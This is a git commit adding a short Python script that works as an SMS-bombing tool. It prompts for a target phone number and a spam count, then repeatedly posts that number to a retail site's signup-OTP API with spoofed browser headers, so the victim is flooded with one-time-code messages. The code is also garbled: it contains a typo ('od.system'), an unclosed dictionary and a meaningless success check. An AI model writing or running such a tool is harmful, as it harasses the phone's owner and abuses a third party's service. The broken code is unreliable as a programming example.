b34e94aed951f1ed646cf15abcd65bad41f1c750
aswarlod82 <85016106+aswarlod82@users.noreply.github.com>
2021-06-18 18:23:29 +0800

    Add files via upload

---
+++ lod82.py
@@ -0,0 +1,44 @@
+import json
+import requests
+import sys
+import os
+
+
+def main():
+	os.system('clear')
+	od.system('figlet aswarlod82')
+	banner = '''
+
+
+	[+]AUTHOR : aswarlod82
+	[+]faceboo : aswarlod82
+	'''
+
+	print(banner)
+	no = input('target : ' )
+	jum = input('jumlah spm : ')
+
+
+	head = {
+	"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
+	"Referer": "https://www.mapclub.com/en/user/signup",
+	"Host": "cmsapi.mapclub.com",
+	}
+
+
+	dat = {
+	'phone' : no
+
+	for x in range(int(jum)):
+		leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)
+	if 'eror' in leosureo:
+		print('gagal mengirim' + no)
+	else:
+		print('succes mengirim' + no)
+
+
+
+main()
+
+
+
